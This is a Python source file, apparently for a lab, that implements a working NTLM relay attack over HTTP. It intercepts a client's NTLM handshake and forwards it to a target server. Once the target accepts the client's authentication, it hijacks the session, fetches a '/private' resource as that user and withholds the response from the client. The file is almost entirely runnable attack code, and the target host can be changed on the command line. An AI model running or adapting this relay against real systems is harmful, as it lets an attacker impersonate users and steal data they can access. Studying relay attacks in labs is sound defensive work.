import argparse
import base64
import socket
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer


LISTEN_HOST = "0.0.0.0"
LISTEN_PORT = 8090

TARGET_HOST = "127.0.0.1"
TARGET_PORT = 8080

SOCKET_TIMEOUT = 30
MAX_HEADER_SIZE = 65536


def get_ntlm_message_type(token):
    # Проверяем сигнатуру NTLMSSP и читаем поле MessageType.
    if len(token) < 12:
        return None

    if token[:8] != b"NTLMSSP\x00":
        return None

    return int.from_bytes(token[8:12], "little")


def get_ntlm_name(message_type):
    names = {
        1: "NEGOTIATE",
        2: "CHALLENGE",
        3: "AUTHENTICATE",
    }

    return names.get(message_type, f"UNKNOWN({message_type})")


def get_ntlm_message_type_from_header(header_value):
    # Достаём тип NTLM-сообщения из Authorization / WWW-Authenticate.
    if not header_value:
        return None

    for part in header_value.split(","):
        part = part.strip()

        if not part.upper().startswith("NTLM"):
            continue

        token_data = part[4:].strip()

        if not token_data:
            return None

        try:
            token = base64.b64decode(token_data, validate=True)
        except Exception:
            return None

        return get_ntlm_message_type(token)

    return None


def print_ntlm_header(direction, header_value):
    # Печатаем тип NTLM-токена. Токен не модифицируется.
    if not header_value:
        return

    for part in header_value.split(","):
        part = part.strip()

        if not part.upper().startswith("NTLM"):
            continue

        token_data = part[4:].strip()

        if not token_data:
            print(f"{direction}: NTLM")
            return

        try:
            token = base64.b64decode(token_data, validate=True)
        except Exception:
            print(f"{direction}: NTLM decode error")
            return

        message_type = get_ntlm_message_type(token)

        print(
            f"{direction}: "
            f"NTLM {get_ntlm_name(message_type)} "
            f"({len(token)} bytes)"
        )

        return


def get_header(headers, name):
    for header_name, value in headers:
        if header_name.lower() == name.lower():
            return value

    return None


def get_status_code(start_line):
    if not start_line.startswith("HTTP/"):
        return None

    parts = start_line.split(" ", 2)

    if len(parts) < 2:
        return None

    try:
        return int(parts[1])
    except ValueError:
        return None


def serialize_http(start_line, headers, body=b""):
    lines = [start_line]

    for name, value in headers:
        lines.append(f"{name}: {value}")

    lines.append("")
    lines.append("")

    return "\r\n".join(lines).encode("iso-8859-1") + body


def recv_http_message(sock, head_request=False):
    # Читаем из сокета одно полное HTTP-сообщение.
    # None означает, что соединение было закрыто.
    data = b""

    while b"\r\n\r\n" not in data:
        chunk = sock.recv(4096)

        if not chunk:
            return None

        data += chunk

        if len(data) > MAX_HEADER_SIZE:
            raise RuntimeError("HTTP header too large")

    header_end = data.index(b"\r\n\r\n")

    header_text = data[:header_end].decode("iso-8859-1")
    body_data = data[header_end + 4:]

    lines = header_text.split("\r\n")

    start_line = lines[0]
    headers = []

    for line in lines[1:]:
        if ":" not in line:
            continue

        name, value = line.split(":", 1)
        headers.append((name.strip(), value.strip()))

    transfer_encoding = get_header(headers, "Transfer-Encoding")

    if transfer_encoding and transfer_encoding.lower() != "identity":
        raise RuntimeError(
            f"Transfer-Encoding {transfer_encoding} not supported"
        )

    content_length_value = get_header(headers, "Content-Length")

    try:
        content_length = int(content_length_value or "0")
    except ValueError:
        raise RuntimeError("Invalid Content-Length")

    if content_length < 0:
        raise RuntimeError("Invalid Content-Length")

    # HEAD и некоторые HTTP-статусы не содержат тело ответа.
    no_body = head_request

    status_code = get_status_code(start_line)

    if status_code is not None:
        if 100 <= status_code < 200 or status_code in (204, 304):
            no_body = True

    if no_body:
        return start_line, headers, b""

    body = body_data

    while len(body) < content_length:
        chunk = sock.recv(
            min(4096, content_length - len(body))
        )

        if not chunk:
            raise RuntimeError(
                "Connection closed before full body received"
            )

        body += chunk

    return start_line, headers, body[:content_length]


class RelayHandler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def setup(self):
        super().setup()

        # NTLM привязан к TCP-соединению, поэтому соединение с target
        # сохраняется до закрытия соединения клиента.
        self.target_sock = None
        self.authenticated = False

    def finish(self):
        self.close_target()

        try:
            super().finish()
        except Exception:
            pass

    def connect_target(self):
        if self.target_sock is not None:
            return self.target_sock

        self.target_sock = socket.create_connection(
            (TARGET_HOST, TARGET_PORT),
            timeout=SOCKET_TIMEOUT,
        )

        self.target_sock.settimeout(SOCKET_TIMEOUT)

        print(
            f"[*] Connected to target "
            f"{TARGET_HOST}:{TARGET_PORT}"
        )

        return self.target_sock

    def close_target(self):
        if self.target_sock is None:
            return

        try:
            self.target_sock.shutdown(socket.SHUT_RDWR)
        except OSError:
            pass

        try:
            self.target_sock.close()
        except OSError:
            pass

        self.target_sock = None

        print("[*] Target connection closed")

    def read_request_body(self):
        transfer_encoding = self.headers.get("Transfer-Encoding")

        if transfer_encoding and transfer_encoding.lower() != "identity":
            raise RuntimeError(
                "Chunked requests are not supported"
            )

        try:
            content_length = int(
                self.headers.get("Content-Length", "0") or "0"
            )
        except ValueError:
            raise RuntimeError("Invalid Content-Length")

        if content_length < 0:
            raise RuntimeError("Invalid Content-Length")

        if content_length == 0:
            return b""

        return self.rfile.read(content_length)

    def make_target_headers(self, body):
        # Host подменяем на адрес target'а.
        # Authorization не трогаем — иначе NTLM ломается.
        headers = []

        skip_headers = {
            "host",
            "connection",
            "proxy-connection",
            "content-length",
            "transfer-encoding",
        }

        for name, value in self.headers.items():
            if name.lower() in skip_headers:
                continue

            headers.append((name, value))

        headers.append(
            ("Host", f"{TARGET_HOST}:{TARGET_PORT}")
        )

        headers.append(
            ("Connection", "keep-alive")
        )

        if body:
            headers.append(
                ("Content-Length", str(len(body)))
            )

        elif self.command in ("POST", "PUT", "PATCH"):
            headers.append(
                ("Content-Length", "0")
            )

        return headers

    def request_private_resource(self):
        # После успешного Type 3 сессия с target'ом уже
        # аутентифицирована. Relay пользуется ей сам: отправляет
        # новый запрос без Authorization и получает приватные
        # данные от имени клиента.
        request = serialize_http(
            "GET /private HTTP/1.1",
            [
                ("Host", f"{TARGET_HOST}:{TARGET_PORT}"),
                ("Connection", "keep-alive"),
            ],
        )

        self.target_sock.sendall(request)

        response = recv_http_message(self.target_sock)

        if response is None:
            print("[-] Target closed connection")
            return

        start_line, _, body = response

        print(f"[+] Target response: {start_line}")
        print()
        print("[+] Private resource:")
        print(body.decode("utf-8", errors="replace"))

    def handle_request(self):
        try:
            body = self.read_request_body()

        except RuntimeError as error:
            print(f"[-] Request error: {error}")

            self.send_error(400, str(error))
            self.close_connection = True
            return

        authorization = self.headers.get("Authorization")
        request_ntlm_type = None

        if authorization:
            request_ntlm_type = get_ntlm_message_type_from_header(
                authorization
            )

            print_ntlm_header(
                "CLIENT -> TARGET",
                authorization,
            )

        else:
            print(
                f"CLIENT -> TARGET: "
                f"{self.command} {self.path} "
                "(no Authorization)"
            )

        start_line = (
            f"{self.command} {self.path} HTTP/1.1"
        )

        target_headers = self.make_target_headers(body)

        try:
            target = self.connect_target()

            target.sendall(
                serialize_http(
                    start_line,
                    target_headers,
                    body,
                )
            )

        except (OSError, socket.timeout) as error:
            print(f"[-] Target connection error: {error}")

            self.close_target()

            self.send_error(502, "Target unavailable")

            self.close_connection = True
            return

        try:
            response = recv_http_message(
                target,
                head_request=(self.command == "HEAD"),
            )

        except (RuntimeError, OSError, socket.timeout) as error:
            print(f"[-] Target response error: {error}")

            self.close_target()

            self.send_error(502, "Target response error")

            self.close_connection = True
            return

        if response is None:
            print("[-] Target closed connection without response")

            self.close_target()

            self.send_error(502, "Target closed connection")

            self.close_connection = True
            return

        response_start, response_headers, response_body = response

        status_code = get_status_code(response_start)

        for name, value in response_headers:
            if name.lower() == "www-authenticate":
                print_ntlm_header(
                    "TARGET -> CLIENT",
                    value,
                )

        target_closes_connection = False

        for name, value in response_headers:
            if (
                name.lower() == "connection"
                and value.lower() == "close"
            ):
                target_closes_connection = True

        # Target принял нашу (то есть клиентскую) аутентификацию.
        # Клиенту ответ не отдаём — сессией пользуется relay.
        if request_ntlm_type == 3 and status_code == 200:
            self.authenticated = True

            print("[+] NTLM AUTHENTICATE accepted by target")
            print("[+] Relay now owns the authenticated session")
            print()

            self.request_private_resource()

            self.close_connection = True
            return

        if request_ntlm_type == 3 and status_code == 401:
            print("[-] NTLM AUTHENTICATE rejected by target")

        # Готовим ответ клиенту: свои Connection и Content-Length,
        # остальные заголовки — как есть от target'а.
        client_headers = []

        original_content_length = get_header(
            response_headers,
            "Content-Length",
        )

        for name, value in response_headers:
            if name.lower() in {
                "connection",
                "content-length",
                "transfer-encoding",
            }:
                continue

            client_headers.append((name, value))

        if self.command == "HEAD":
            client_headers.append(
                (
                    "Content-Length",
                    original_content_length or "0",
                )
            )

        else:
            client_headers.append(
                (
                    "Content-Length",
                    str(len(response_body)),
                )
            )

        client_closes_connection = (
            self.headers.get(
                "Connection",
                "",
            ).lower() == "close"
        )

        if target_closes_connection or client_closes_connection:
            client_headers.append(
                ("Connection", "close")
            )

            self.close_connection = True

        else:
            client_headers.append(
                ("Connection", "keep-alive")
            )

        print(
            f"TARGET -> CLIENT: "
            f"{response_start} "
            f"({len(response_body)} bytes)"
        )

        try:
            self.wfile.write(
                serialize_http(
                    response_start,
                    client_headers,
                    response_body,
                )
            )

            self.wfile.flush()

        except (OSError, ConnectionError):
            self.close_connection = True

        if target_closes_connection:
            self.close_target()

    def do_GET(self):
        self.handle_request()

    def do_POST(self):
        self.handle_request()

    def do_HEAD(self):
        self.handle_request()

    def log_message(self, format, *args):
        pass


def parse_args():
    parser = argparse.ArgumentParser(
        description="NTLM relay lab service"
    )

    parser.add_argument(
        "--listen-host",
        default=LISTEN_HOST,
    )

    parser.add_argument(
        "--listen-port",
        type=int,
        default=LISTEN_PORT,
    )

    parser.add_argument(
        "--target-host",
        default=TARGET_HOST,
    )

    parser.add_argument(
        "--target-port",
        type=int,
        default=TARGET_PORT,
    )

    return parser.parse_args()


def main():
    global LISTEN_HOST
    global LISTEN_PORT
    global TARGET_HOST
    global TARGET_PORT

    args = parse_args()

    LISTEN_HOST = args.listen_host
    LISTEN_PORT = args.listen_port

    TARGET_HOST = args.target_host
    TARGET_PORT = args.target_port

    server = ThreadingHTTPServer(
        (LISTEN_HOST, LISTEN_PORT),
        RelayHandler,
    )

    print("NTLM relay service")
    print(f"Listening on http://{LISTEN_HOST}:{LISTEN_PORT}")
    print(f"Target: http://{TARGET_HOST}:{TARGET_PORT}")
    print("Press Ctrl+C to stop")
    print()

    try:
        server.serve_forever()

    except KeyboardInterrupt:
        print("\nRelay stopped.")

    finally:
        server.server_close()


if __name__ == "__main__":
    main()